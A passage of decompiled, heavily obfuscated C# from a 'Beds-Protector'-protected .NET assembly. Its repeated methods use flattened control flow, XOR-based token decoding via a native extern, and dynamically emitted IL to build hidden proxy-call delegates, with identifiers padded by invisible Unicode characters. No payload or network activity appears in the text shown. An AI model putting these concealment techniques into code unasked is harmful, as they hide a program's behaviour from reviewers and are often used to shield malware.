        if (num1 != 40745 - 85800 + 45066)
          goto label_32;
      }
      else
        goto label_35;
label_31:
      dynamicMethod = (DynamicMethod) null;
      num1 = 50898 + 40532 - 91418;
label_32:
      int index2;
      if (num1 == 45577 - 130670 + 85113)
      {
        index2 = 0;
        num1 = 59080 - 105615 + 46556;
      }
      if (num1 != 69534 - 96291 + 26781)
        goto label_37;
label_35:
      if (index2 >= parameterTypes.Length)
        num1 = 29751 + 31120 - 60846;
      else
        goto label_40;
label_37:
      if (num1 == 27035 - 87460 + 60434)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 20246 + 21141 - 41377;
      }
      if (num1 != 54033 - 149971 + 95960)
        goto label_41;
label_40:
      ParameterInfo[] parameters;
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 59350 - 117160 + 57833;
label_41:
      if (num1 == 86519 - 75257 - 11239)
      {
        ++index2;
        num1 = 79722 - 25458 - 54240;
      }
      if (num1 == 81434 - 93747 + 12331)
      {
        parameters = methodInfo.GetParameters();
        num1 = 31223 - 115539 + 84335;
      }
      if (num1 == 53481 - 120512 + 67050)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 51099 - 112749 + 61670;
      }
      if (num1 == 90382 - 146743 + 56373)
      {
        parameterTypes = (Type[]) null;
        num1 = 25309 + 69297 - 94593;
      }
      if (num1 == 92001 - 48167 - 43830)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num3 = num2 - 1]) << 24) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 16) + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num5 = num4 - 1]) << 8);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[2] ^ (int) numArray[num2 = num7 - 1]) << 0;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoggBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoggBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 3688 - 21966 + 18283;
      }
      if (num1 == 95458 - 114899 + 19441)
        num1 = 27280 - 93175 + 65896;
      continue;
label_57:
      if (index1 < methods.Length)
        goto label_25;
      else
        goto label_58;
    }
    while (num1 != 35316 - 94098 + 58808);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoggBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoggBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogGBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogGBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 72540 - 17527 - 55013;
    FieldInfo fieldFromHandle;
    MethodInfo methodInfo;
    Type fieldType;
    Type[] parameterTypes;
    MethodBase method;
    Type declaringType;
    DynamicMethod dynamicMethod;
    do
    {
      int metadataToken;
      if (num1 == 48514 - 53823 + 5314)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 76099 - 126617 + 50524;
      }
      int index1;
      if (num1 == 74326 - 32538 - 41771)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 34289 - 124692 + 90421;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      if (num1 != 95964 + 1459 - 97399)
        goto label_9;
label_7:
      int index2;
      if (index2 >= parameterTypes.Length)
        num1 = 16646 - 97592 + 80971;
      else
        goto label_29;
label_9:
      if (num1 == 10410 - 92048 + 81648)
        return;
      byte[] numArray;
      int num2;
      if (num1 == 27747 + 64894 - 92637)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num4 = num3 - 1]) << 16) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num5 = num4 - 1]) << 24);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[1] ^ (int) numArray[num2 = num7 - 1]) << 8;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoghBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoghBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 60954 + 1154 - 62103;
      }
      if (num1 == 18403 + 2861 - 21252)
      {
        parameterTypes = (Type[]) null;
        num1 = 10159 + 1360 - 11506;
      }
      if (num1 == 89278 - 37310 - 51943)
      {
        declaringType = method.DeclaringType;
        num1 = 93306 - 9716 - 83564;
      }
      if (num1 != 76512 - 93759 + 17258)
        goto label_18;
label_17:
      dynamicMethod = (DynamicMethod) null;
      num1 = 26333 + 29019 - 55340;
label_18:
      ParameterInfo[] parameters;
      if (num1 != 68496 - 66391 - 2090)
      {
        if (num1 == 73364 - 133394 + 60048)
        {
          parameters = methodInfo.GetParameters();
          num1 = 7249 + 34230 - 41460;
        }
        if (num1 == 57887 - 145025 + 87152)
        {
          index1 = 0;
          num1 = 79667 - 28526 - 51126;
        }
        if (num1 != 27289 + 69169 - 96437)
        {
          if (num1 == 19366 + 29027 - 48384)
          {
            fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
            num1 = 98084 - 23479 - 74595;
          }
          if (num1 == 53825 - 53445 - 378)
          {
            numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
            num1 = 59817 + 37297 - 97111;
          }
          if (num1 != 60013 - 4279 - 55712)
            goto label_30;
        }
        else
          goto label_7;
      }
      else
        goto label_57;
label_29:
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 17029 + 49311 - 66317;
label_30:
      if (num1 == 51458 - 56131 + 4696)
      {
        ++index2;
        num1 = 45730 + 10483 - 56189;
      }
      if (num1 == 96412 - 126146 + 29741)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 66132 - 91846 + 25722;
      }
      if (num1 == 58902 - 150198 + 91302)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 14760 + 30272 - 45025;
      }
      if (num1 == 23556 - 60478 + 36930)
      {
        if (method.IsStatic)
          num1 = 85452 - 160773 + 75330;
        else
          goto label_17;
      }
      if (num1 == 41081 - 547 - 40514)
      {
        index2 = 0;
        num1 = 90040 - 83616 - 6403;
      }
      if (num1 == 95413 - 23307 - 72103)
      {
        num2 = numArray.Length;
        num1 = 42204 + 30120 - 72320;
      }
      if (num1 == 14583 + 67121 - 81685)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 92195 - 71484 - 20691;
      }
      MethodInfo[] methods;
      if (num1 == 44854 - 120866 + 76025)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 74656 - 124696 + 50054;
      }
      if (num1 == 70406 + 5808 - 76213)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 42032 + 10686 - 52716;
      }
      if (num1 != 29386 - 104012 + 74642)
        goto label_51;
label_50:
      methodInfo = methods[index1];
      num1 = 29366 - 44177 + 14828;
label_51:
      if (num1 == 61514 + 15675 - 77189)
        num1 = 23337 - 63327 + 39991;
      continue;
label_57:
      if (index1 < methods.Length)
        goto label_50;
      else
        goto label_58;
    }
    while (num1 != 53618 - 5424 - 48168);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoghBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoghBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogHBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogHBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 18981 - 49246 + 30265;
    MethodInfo methodInfo;
    Type fieldType;
    FieldInfo fieldFromHandle;
    MethodBase method;
    Type[] parameterTypes;
    Type declaringType;
    DynamicMethod dynamicMethod;
    do
    {
      int index1;
      if (num1 == 10284 + 63340 - 73607)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 76490 + 16239 - 92711;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      int index2;
      if (num1 == 99305 - 141480 + 42195)
      {
        index2 = 0;
        num1 = 90459 - 180351 + 89913;
      }
      ParameterInfo[] parameters;
      if (num1 == 30190 - 124274 + 94102)
      {
        parameters = methodInfo.GetParameters();
        num1 = 49061 + 19387 - 68429;
      }
      if (num1 != 97678 - 48515 - 49142)
      {
        if (num1 != 43501 - 26510 - 16975)
          goto label_11;
      }
      else
        goto label_37;
label_10:
      MethodInfo[] methods;
      methodInfo = methods[index1];
      num1 = 13596 + 36033 - 49612;
label_11:
      int metadataToken;
      if (num1 == 1886 - 68470 + 66590)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 48454 + 45947 - 94394;
      }
      byte[] numArray;
      int num2;
      if (num1 == 79108 - 53697 - 25407)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 16) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num5 = num4 - 1]) << 24);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[1] ^ (int) numArray[num2 = num7 - 1]) << 0;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogiBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogiBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 81930 - 78948 - 2977;
      }
      if (num1 == 72632 - 50486 - 22138)
      {
        if (method.IsStatic)
          num1 = 87275 - 173256 + 85990;
        else
          goto label_44;
      }
      if (num1 == 45888 - 17836 - 28047)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 79738 - 54337 - 25395;
      }
      if (num1 == 81122 - 135948 + 54840)
      {
        index1 = 0;
        num1 = 78306 - 97373 + 19082;
      }
      if (num1 == 75735 - 121119 + 45386)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 92582 - 189983 + 97404;
      }
      if (num1 != 23323 - 60688 + 37380)
      {
        if (num1 == 43021 - 35317 - 7694)
          return;
        if (num1 == 73162 - 101523 + 28368)
        {
          fieldType = fieldFromHandle.FieldType;
          num1 = 30984 - 117782 + 86806;
        }
        if (num1 == 43978 + 21564 - 65523)
        {
          parameterTypes = new Type[parameters.Length];
          num1 = 41195 - 92038 + 50863;
        }
        if (num1 == 870 + 39553 - 40410)
        {
          methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
          num1 = 60478 + 6325 - 66789;
        }
        if (num1 == 57590 - 94231 + 36642)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 24733 - 33636 + 8905;
        }
        if (num1 == 45367 + 48610 - 93952)
        {
          declaringType = method.DeclaringType;
          num1 = 40461 - 34880 - 5555;
        }
        if (num1 != 17700 - 15418 - 2258)
          goto label_39;
      }
      else
        goto label_57;
label_37:
      if (index2 >= parameterTypes.Length)
        num1 = 13000 + 3536 - 16511;
      else
        goto label_50;
label_39:
      if (num1 == 90713 - 17578 - 73126)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 58580 - 124995 + 66425;
      }
      if (num1 == 31881 - 51286 + 19417)
      {
        parameterTypes = (Type[]) null;
        num1 = 86516 - 125979 + 39476;
      }
      if (num1 != 47176 - 37613 - 9552)
        goto label_45;
label_44:
      dynamicMethod = (DynamicMethod) null;
      num1 = 40905 - 55066 + 14173;
label_45:
      if (num1 == 77635 + 14661 - 92273)
      {
        ++index2;
        num1 = 19462 - 63402 + 43964;
      }
      if (num1 == 92853 - 178280 + 85430)
      {
        num2 = numArray.Length;
        num1 = 59968 - 30097 - 29867;
      }
      if (num1 != 47075 + 48605 - 95658)
        goto label_51;
label_50:
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 37569 + 23898 - 61444;
label_51:
      if (num1 == 93662 - 102694 + 9032)
        num1 = 70217 - 152040 + 81824;
      continue;
label_57:
      if (index1 < methods.Length)
        goto label_10;
      else
        goto label_58;
    }
    while (num1 != 89488 - 175487 + 86025);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogiBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogiBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogIBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogIBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 54476 - 54496 + 20;
    Type[] parameterTypes;
    FieldInfo fieldFromHandle;
    Type fieldType;
    MethodBase method;
    Type declaringType;
    MethodInfo methodInfo;
    DynamicMethod dynamicMethod;
    do
    {
      if (num1 != 96003 - 142362 + 46383)
        goto label_4;
label_2:
      int index1;
      if (index1 >= parameterTypes.Length)
        num1 = 88085 - 144775 + 56715;
      else
        goto label_18;
label_4:
      byte[] numArray;
      int num2;
      int metadataToken;
      if (num1 == 24238 - 86610 + 62376)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num5 = num4 - 1]) << 16);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[0] ^ (int) numArray[num2 = num7 - 1]) << 24;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogjBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogjBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 29162 - 119071 + 89914;
      }
      if (num1 == 80994 - 139617 + 58633)
        return;
      int index2;
      if (num1 == 43818 - 22720 - 21084)
      {
        index2 = 0;
        num1 = 41471 + 48108 - 89564;
      }
      if (num1 == 50438 + 5140 - 55575)
      {
        num2 = numArray.Length;
        num1 = 9835 + 10449 - 20280;
      }
      if (num1 == 29892 + 57938 - 87818)
      {
        parameterTypes = (Type[]) null;
        num1 = 85410 - 132095 + 46698;
      }
      if (num1 == 83484 - 130617 + 47142)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 38942 - 83293 + 44361;
      }
      if (num1 == 99067 - 132324 + 33282)
      {
        declaringType = method.DeclaringType;
        num1 = 19118 - 40031 + 20939;
      }
      if (num1 != 23190 - 47350 + 24182)
        goto label_19;
label_18:
      ParameterInfo[] parameters;
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 8142 + 61888 - 70007;
label_19:
      if (num1 == 78935 - 49363 - 29552)
      {
        index1 = 0;
        num1 = 56818 - 101227 + 44430;
      }
      if (num1 == 40156 + 1139 - 41276)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 42095 - 69425 + 27350;
      }
      if (num1 == 2096 - 10043 + 7948)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 65458 + 11935 - 77391;
      }
      if (num1 == 76994 - 53369 - 23617)
      {
        if (method.IsStatic)
          num1 = 6028 + 76723 - 82742;
        else
          goto label_48;
      }
      if (num1 == 56281 - 111496 + 55221)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 34635 - 64663 + 30035;
      }
      MethodInfo[] methods;
      if (num1 == 96098 - 123805 + 27720)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 17810 - 1727 - 16069;
      }
      if (num1 != 60444 + 17146 - 77575)
      {
        if (num1 != 3084 - 96339 + 93276)
        {
          if (num1 != 80898 + 12991 - 93873)
            goto label_36;
        }
        else
          goto label_2;
      }
      else
        goto label_57;
label_35:
      methodInfo = methods[index2];
      num1 = 46790 - 52553 + 5780;
label_36:
      if (num1 == 52466 + 46389 - 98853)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 50116 + 46809 - 96922;
      }
      if (num1 == 89208 - 115715 + 26530)
      {
        ++index1;
        num1 = 63958 + 11240 - 75174;
      }
      if (num1 == 99629 - 188721 + 89109)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 91878 - 171260 + 79400;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 == 99815 - 166870 + 67073)
      {
        parameters = methodInfo.GetParameters();
        num1 = 37747 - 129797 + 92069;
      }
      if (num1 == 89466 - 158460 + 68999)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 14426 + 61583 - 76003;
      }
      if (num1 != 36162 - 24996 - 11155)
        goto label_49;
      else
        goto label_48;
label_57:
      if (index2 < methods.Length)
        goto label_35;
      else
        goto label_58;
label_48:
      dynamicMethod = (DynamicMethod) null;
      num1 = 21939 - 26190 + 4263;
label_49:
      if (num1 == 17216 - 43336 + 26127)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 80653 - 9347 - 71298;
      }
      if (num1 == 59340 - 70313 + 10973)
        num1 = 14637 + 18101 - 32737;
    }
    while (num1 != 11963 + 4529 - 16466);
